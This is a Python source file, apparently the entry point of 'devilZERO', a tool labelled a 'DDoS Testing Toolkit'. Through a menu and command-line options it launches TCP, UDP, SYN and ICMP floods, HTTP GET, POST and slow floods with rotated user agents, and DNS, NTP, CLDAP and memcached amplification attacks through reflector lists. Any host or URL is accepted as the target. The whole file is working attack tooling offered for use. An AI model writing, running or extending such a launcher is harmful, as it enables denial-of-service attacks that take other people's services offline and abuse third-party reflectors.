import argparse
import sys
import threading
import time
import socket as sock_mod
from pathlib import Path

from devilzero.utils import (
    Colors, clear_screen, print_banner, confirm_action,
    safe_input, print_error, print_success, print_info, print_warning, is_root
)
from devilzero.layer4 import Layer4
from devilzero.layer7 import HttpFlood
from devilzero.amplification import DNSAmplification
from devilzero.proxy import ProxyPool
from devilzero import config


def run_layer4(host, port, method, threads, duration):
    if method in ("SYN", "ICMP") and not is_root():
        print_error(f"{method} requires root. Run with sudo.")
        return
    try:
        host_ip = sock_mod.gethostbyname(host)
    except Exception as e:
        print_error(f"Cannot resolve host: {e}")
        return
    event = threading.Event()
    event.clear()
    for _ in range(threads):
        Layer4((host_ip, port), method=method, synevent=event).start()
    print_success(f"{method} flood on {host}:{port} for {duration}s")
    event.set()
    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        bar = '█' * int(30 * elapsed / duration) + '░' * (30 - int(30 * elapsed / duration))
        print(f"\r{Colors.WARNING}[{bar}] {elapsed}s/{duration}s{Colors.RESET}", end='')
        time.sleep(1)
    print()
    event.clear()
    print_success("Attack stopped")


def run_layer7(target_url, method, threads, duration, rpc=1):
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    try:
        from yarl import URL
        url = URL(target_url)
        host = sock_mod.gethostbyname(url.host)
    except Exception as e:
        print_error(f"Invalid URL: {e}")
        return
    ua_file = Path(__file__).parent / 'data' / 'useragent.txt'
    ref_file = Path(__file__).parent / 'data' / 'referers.txt'
    useragents = set()
    referers = set()
    if ua_file.exists():
        with open(ua_file) as f:
            useragents = {l.strip() for l in f if l.strip()}
    if ref_file.exists():
        with open(ref_file) as f:
            referers = {l.strip() for l in f if l.strip()}
    event = threading.Event()
    event.clear()
    for tid in range(threads):
        HttpFlood(tid, url, host, method, rpc, event, useragents, referers).start()
    print_success(f"{method} flood on {target_url} for {duration}s")
    event.set()
    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        bar = '█' * int(30 * elapsed / duration) + '░' * (30 - int(30 * elapsed / duration))
        print(f"\r{Colors.WARNING}[{bar}] {elapsed}s/{duration}s{Colors.RESET}", end='')
        time.sleep(1)
    print()
    event.clear()
    print_success("Attack stopped")


def run_amp(host, port, method, threads, duration, ref_file):
    if not is_root():
        print_error("Amplification requires root")
        return
    try:
        host_ip = sock_mod.gethostbyname(host)
    except Exception as e:
        print_error(f"Cannot resolve host: {e}")
        return
    ref_path = Path(ref_file)
    if not ref_path.exists():
        print_error(f"Reflector file not found: {ref_file}")
        return
    with open(ref_path) as f:
        reflectors = [l.strip() for l in f if l.strip() and l.strip()[0].isdigit()]
    if not reflectors:
        print_error("No valid reflectors found")
        return
    print_success(f"Loaded {len(reflectors)} reflectors")
    event = threading.Event()
    event.clear()
    for _ in range(threads):
        Layer4((host_ip, port), ref=reflectors, method=method, synevent=event).start()
    print_success(f"{method} amplification on {host}:{port} for {duration}s")
    event.set()
    start = time.time()
    while time.time() - start < duration:
        elapsed = int(time.time() - start)
        bar = '█' * int(30 * elapsed / duration) + '░' * (30 - int(30 * elapsed / duration))
        print(f"\r{Colors.WARNING}[{bar}] {elapsed}s/{duration}s{Colors.RESET}", end='')
        time.sleep(1)
    print()
    event.clear()
    print_success("Attack stopped")


def interactive_menu():
    while True:
        clear_screen()
        print_banner()
        if not is_root():
            print_warning("Some attacks (SYN, ICMP, amplification) require root")
        print(f"{Colors.BOLD}{Colors.OKCYAN}Main Menu:{Colors.RESET}")
        print(f"  {Colors.WARNING}1{Colors.RESET}) Layer4 (TCP/UDP/SYN/ICMP)")
        print(f"  {Colors.WARNING}2{Colors.RESET}) Layer7 (GET/POST/SLOW)")
        print(f"  {Colors.WARNING}3{Colors.RESET}) Amplification (DNS/NTP/RDP/CLDAP/MEM/CHAR/ARD)")
        print(f"  {Colors.WARNING}4{Colors.RESET}) Exit")
        choice = safe_input(f"{Colors.OKGREEN}Select [1-4]{Colors.RESET}: ", default='4', type_func=str)
        if choice == '1':
            host = safe_input("Target IP: ", type_func=str)
            port = safe_input("Port: ", default=80, type_func=int)
            method = safe_input("Method (TCP/UDP/SYN/ICMP): ", default='TCP', type_func=str).upper()
            threads = safe_input("Threads: ", default=100, type_func=int)
            duration = safe_input("Duration (s): ", default=60, type_func=int)
            run_layer4(host, port, method, threads, duration)
            input("\nPress Enter...")
        elif choice == '2':
            target = safe_input("Target URL: ", type_func=str)
            method = safe_input("Method (GET/POST/SLOW): ", default='GET', type_func=str).upper()
            threads = safe_input("Threads: ", default=100, type_func=int)
            duration = safe_input("Duration (s): ", default=60, type_func=int)
            rpc = safe_input("RPC: ", default=1, type_func=int)
            run_layer7(target, method, threads, duration, rpc)
            input("\nPress Enter...")
        elif choice == '3':
            host = safe_input("Target IP: ", type_func=str)
            port = safe_input("Port: ", default=53, type_func=int)
            method = safe_input("Method (DNS/NTP/RDP/CLDAP/MEM/CHAR/ARD): ", default='DNS', type_func=str).upper()
            threads = safe_input("Threads: ", default=100, type_func=int)
            duration = safe_input("Duration (s): ", default=60, type_func=int)
            ref_file = safe_input("Reflector file path: ", type_func=str)
            run_amp(host, port, method, threads, duration, ref_file)
            input("\nPress Enter...")
        elif choice == '4':
            print_success("Goodbye")
            sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description='devilZERO - DDoS Testing Toolkit')
    parser.add_argument('--version', action='version', version='devilZERO 2.0.0')
    parser.add_argument('--layer4', nargs=4, metavar=('HOST', 'PORT', 'METHOD', 'THREADS'))
    parser.add_argument('--layer7', nargs=3, metavar=('URL', 'METHOD', 'THREADS'))
    parser.add_argument('--amp', nargs=5, metavar=('HOST', 'PORT', 'METHOD', 'THREADS', 'REFLECTOR_FILE'))
    parser.add_argument('--duration', type=int, default=60)
    args = parser.parse_args()
    if len(sys.argv) == 1:
        interactive_menu()
        return
    if args.layer4:
        h, p, m, t = args.layer4
        run_layer4(h, int(p), m.upper(), int(t), args.duration)
    elif args.layer7:
        u, m, t = args.layer7
        run_layer7(u, m.upper(), int(t), args.duration)
    elif args.amp:
        h, p, m, t, rf = args.amp
        run_amp(h, int(p), m.upper(), int(t), args.duration, rf)


if __name__ == '__main__':
    main()